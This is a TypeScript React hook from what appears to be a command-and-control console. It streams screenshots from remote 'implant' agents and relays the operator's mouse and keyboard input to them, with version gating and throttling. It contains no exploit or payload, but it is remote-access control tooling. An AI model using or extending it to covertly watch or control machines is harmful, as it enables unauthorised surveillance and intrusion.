"use client";

import { useCallback, useEffect, useMemo, useRef, useState } from "react";
import { toast } from "sonner";
import { useWS } from "@/lib/wsContext";
import { api } from "@/lib/api";
import { paths } from "@/lib/api-paths";
import { useVisibleInterval } from "@/lib/hooks/useVisibleInterval";
import { useI18n } from "@/lib/i18n";
import { logger } from "@/lib/logger";
import { nowTime } from "@/lib/utils";
import { implantBlocksDest } from "../../../_components/implant-version";

type TKey = (key: string, params?: Record<string, string | number>) => string;

export type RdpStatus = "waiting" | "capturing" | "connected" | "error";

export interface ResolutionOption {
  value: string;
  label: string;
  interval: number;
}

export const INTERVAL_BY_RES: Record<string, number> = {
  low: 2000,
  medium: 1000,
  high: 500,
  ultra: 250,
};

/**
 * Remote-desktop session state: screenshot-stream capture, start/stop,
 * mouse/keyboard remote input, fullscreen, and version gating.
 * Experimental: screenshot stream + remote_input tasks, not a full RDP stack.
 */
export function useRemoteDesktop(agentId: string) {
  const { t } = useI18n();
  const { subscribe } = useWS();

  const RESOLUTIONS: ResolutionOption[] = useMemo(
    () => [
      { value: "low", label: t("agents.rdp_low"), interval: INTERVAL_BY_RES.low },
      { value: "medium", label: t("agents.rdp_medium"), interval: INTERVAL_BY_RES.medium },
      { value: "high", label: t("agents.rdp_high"), interval: INTERVAL_BY_RES.high },
      { value: "ultra", label: t("agents.rdp_ultra"), interval: INTERVAL_BY_RES.ultra },
    ],
    [t],
  );

  const id = agentId;
  const [monitoring, setMonitoring] = useState(false);
  const monitoringRef = useRef(false);
  const [status, setStatus] = useState<RdpStatus>("waiting");
  const [screenData, setScreenData] = useState<string | null>(null);
  const [resolution, setResolution] = useState<string>("medium");
  const [isFullscreen, setIsFullscreen] = useState(false);
  const [lastUpdate, setLastUpdate] = useState<string>("-");
  const [wsLive, setWsLive] = useState(false);
  const [mouseX, setMouseX] = useState(0);
  const [mouseY, setMouseY] = useState(0);
  const [showCursor, setShowCursor] = useState(false);
  const [nativeWidth, setNativeWidth] = useState(0);
  const [nativeHeight, setNativeHeight] = useState(0);
  const [agentVersion, setAgentVersion] = useState("");

  const imgRef = useRef<HTMLImageElement>(null);
  const containerRef = useRef<HTMLDivElement>(null);
  const moveThrottleRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const lastFrameRef = useRef<string | null>(null);
  const frameRafRef = useRef<number | null>(null);
  const pendingFrameRef = useRef<{ data: string; width?: number; height?: number } | null>(null);
  const cursorRafRef = useRef<number | null>(null);
  const pendingCursorRef = useRef<{ x: number; y: number } | null>(null);
  const captureBusyRef = useRef(false);
  // Reset monitoring state when agent id changes (Next.js reuses
  // the component instance when only the [id] param changes).
  const prevIdRef = useRef(id);
  useEffect(() => {
    if (prevIdRef.current !== id) {
      // Stop any running monitoring for the previous agent
      if (monitoringRef.current) {
        monitoringRef.current = false;
        setMonitoring(false);
        setStatus("waiting");
        setWsLive(false);
        api.post(paths.agents.screenStop(prevIdRef.current)).catch(() => {});
      }
      setScreenData(null);
      lastFrameRef.current = null;
      prevIdRef.current = id;
    }
  }, [id]);

  const pollInterval = INTERVAL_BY_RES[resolution] ?? 1000;
  const versionBlocked = implantBlocksDest(agentVersion, "experimental");

  useEffect(() => {
    if (!id) return;
    const ac = new AbortController();
    api.get(paths.agents.one(id), { signal: ac.signal })
      .then((data) => {
        const raw = (data.agent || data) as { version?: string };
        setAgentVersion(String(raw.version || ""));
      })
      .catch(() => setAgentVersion(""));
    return () => ac.abort();
  }, [id]);

  // Skip polls while the tab is hidden and never start a capture while the
  // previous one is still in flight — keeps slow links from stacking requests.
  const shouldCapture = useCallback(() => !document.hidden && !captureBusyRef.current, []);

  const commitFrame = useCallback((fullData: string, width = 0, height = 0) => {
    pendingFrameRef.current = { data: fullData, width, height };
    if (frameRafRef.current !== null) return;
    frameRafRef.current = requestAnimationFrame(() => {
      frameRafRef.current = null;
      const p = pendingFrameRef.current;
      pendingFrameRef.current = null;
      if (!p) return;
      if (p.data === lastFrameRef.current) return;
      lastFrameRef.current = p.data;
      setLastUpdate(nowTime());
      setStatus("connected");
      setScreenData(p.data);
      if (p.width) setNativeWidth(p.width);
      if (p.height) setNativeHeight(p.height);
    });
  }, []);

  // Background poll failures only update status, never toast.error on every
  // tick (which creates a toast storm for offline beacons). Only
  // user-initiated actions (startMonitoring) toast.
  const captureFrame = useCallback(async () => {
    if (!id) return;
    if (captureBusyRef.current) return;
    captureBusyRef.current = true;
    try {
      const data = await api.get(paths.agents.screenshot(id));
      const imgData = (data.image || data.data || data.screenshot || "") as string;
      if (imgData) {
        const fullData = imgData.startsWith("data:") ? imgData : `data:image/png;base64,${imgData}`;
        commitFrame(fullData, data.width as number, data.height as number);
      }
    } catch {
      setStatus("error");
      // No toast — let the status indicator communicate the error.
    } finally {
      captureBusyRef.current = false;
    }
  }, [id, commitFrame]);

  const startMonitoring = useCallback(async () => {
    if (!id) return;
    if (versionBlocked) {
      toast.error(t("agents.version_unknown_dest"));
      return;
    }
    setStatus("capturing");
    try {
      await api.post(paths.agents.screenStart(id), { interval: String(pollInterval) });
      setMonitoring(true);
      monitoringRef.current = true;
      await captureFrame();
    } catch {
      setStatus("error");
      setMonitoring(false);
      monitoringRef.current = false;
      toast.error(t("agents.rdp_start_failed"));
    }
  }, [id, versionBlocked, t, pollInterval, captureFrame]);

  const stopMonitoring = useCallback(async () => {
    if (!id) return;
    setMonitoring(false);
    monitoringRef.current = false;
    setStatus("waiting");
    try {
      await api.post(paths.agents.screenStop(id));
    } catch {
      toast.error(t("agents.rdp_stop_failed"));
    }
  }, [id, t]);

  useVisibleInterval(
    () => { if (shouldCapture()) void captureFrame(); },
    monitoring ? pollInterval : 0,
  );

  useEffect(() => {
    if (!id) return;
    return subscribe((msg) => {
      if (!monitoringRef.current) return;
      if (msg.type === "screenshot" && String(msg.agent_id) === id && msg.data) {
        setWsLive(true);
        const fullData = String(msg.data).startsWith("data:")
          ? String(msg.data)
          : `data:image/jpeg;base64,${String(msg.data)}`;
        commitFrame(fullData, msg.width ? Number(msg.width) : 0, msg.height ? Number(msg.height) : 0);
      }
    });
  }, [subscribe, id, commitFrame]);

  useEffect(() => {
    return () => {
      if (moveThrottleRef.current) clearTimeout(moveThrottleRef.current);
      if (frameRafRef.current !== null) cancelAnimationFrame(frameRafRef.current);
      if (cursorRafRef.current !== null) cancelAnimationFrame(cursorRafRef.current);
      if (!id) return;
      api.post(paths.agents.screenStop(id)).catch((e) => { logger.error("screenStop failed", e); });
    };
  }, [id]);

  const getRelativeCoords = useCallback((e: React.MouseEvent<HTMLDivElement | HTMLImageElement>) => {
    const img = imgRef.current;
    if (!img) return { x: 0, y: 0 };
    const rect = img.getBoundingClientRect();
    const scaleX = (img.naturalWidth || nativeWidth || 1920) / rect.width;
    const scaleY = (img.naturalHeight || nativeHeight || 1080) / rect.height;
    const x = Math.round((e.clientX - rect.left) * scaleX);
    const y = Math.round((e.clientY - rect.top) * scaleY);
    return { x, y };
  }, [nativeWidth, nativeHeight]);

  const handleClick = useCallback(async (e: React.MouseEvent<HTMLDivElement>) => {
    if (!monitoring || !id) return;
    const { x, y } = getRelativeCoords(e);
    try {
      await api.postJson(paths.agents.remoteInput(id), { type: "click", x, y });
    } catch {
      toast.error(t("agents.rdp_capture_failed"));
    }
  }, [monitoring, id, getRelativeCoords, t]);

  const handleMouseMove = useCallback(
    (e: React.MouseEvent<HTMLDivElement>) => {
      if (!monitoring || !id) return;
      const rect = containerRef.current?.getBoundingClientRect();
      if (rect) {
        // Throttle cursor re-renders to once per animation frame instead
        // of a state update per mousemove event.
        pendingCursorRef.current = { x: e.clientX - rect.left, y: e.clientY - rect.top };
        if (cursorRafRef.current === null) {
          cursorRafRef.current = requestAnimationFrame(() => {
            cursorRafRef.current = null;
            const p = pendingCursorRef.current;
            pendingCursorRef.current = null;
            if (!p) return;
            setMouseX(p.x);
            setMouseY(p.y);
            setShowCursor(true);
          });
        }
      }

      if (moveThrottleRef.current) return;
      moveThrottleRef.current = setTimeout(() => {
        moveThrottleRef.current = null;
        const { x, y } = getRelativeCoords(e);
        api.postJson(paths.agents.remoteInput(id), { type: "move", x, y }).catch(() => {});
      }, 50);
    },
    [monitoring, id, getRelativeCoords],
  );

  const hideCursor = useCallback(() => setShowCursor(false), []);

  useEffect(() => {
    if (!monitoring || !id) return;
    const handler = (e: KeyboardEvent) => {
      if (
        e.target instanceof HTMLInputElement ||
        e.target instanceof HTMLTextAreaElement ||
        e.target instanceof HTMLSelectElement
      ) {
        return;
      }
      const modifierKeys = ["Shift", "Control", "Alt", "Meta", "CapsLock"];
      if (modifierKeys.includes(e.key)) {
        const keyMap: Record<string, string> = { Shift: "shift", Control: "ctrl", Alt: "alt", Meta: "meta", CapsLock: "capslock" };
        const key = keyMap[e.key] || e.key;
        api.postJson(paths.agents.remoteInput(id), { type: "key", key }).catch(() => {});
        return;
      }
      if (e.ctrlKey || e.metaKey) return;
      const keyMap: Record<string, string> = {
        " ": "space",
        Escape: "esc",
        Enter: "enter",
        Tab: "tab",
        Backspace: "backspace",
        Delete: "delete",
        ArrowUp: "up",
        ArrowDown: "down",
        ArrowLeft: "left",
        ArrowRight: "right",
      };
      const key = keyMap[e.key] || e.key;
      if (e.key !== "Escape") e.preventDefault();
      api.postJson(paths.agents.remoteInput(id), { type: "key", key }).catch(() => {});
    };
    document.addEventListener("keydown", handler);
    return () => document.removeEventListener("keydown", handler);
  }, [monitoring, id]);

  const toggleFullscreen = useCallback(async () => {
    if (!containerRef.current) return;
    if (!document.fullscreenElement) {
      await containerRef.current.requestFullscreen();
    } else {
      await document.exitFullscreen();
    }
  }, []);

  useEffect(() => {
    const handler = () => setIsFullscreen(!!document.fullscreenElement);
    document.addEventListener("fullscreenchange", handler);
    return () => document.removeEventListener("fullscreenchange", handler);
  }, []);

  return {
    t: t as TKey,
    RESOLUTIONS, pollInterval,
    monitoring, status, screenData, resolution, setResolution,
    isFullscreen, lastUpdate, wsLive,
    mouseX, mouseY, showCursor, nativeWidth, nativeHeight,
    versionBlocked,
    imgRef, containerRef,
    startMonitoring, stopMonitoring,
    handleClick, handleMouseMove, hideCursor,
    toggleFullscreen,
    setNativeWidth, setNativeHeight,
  };
}
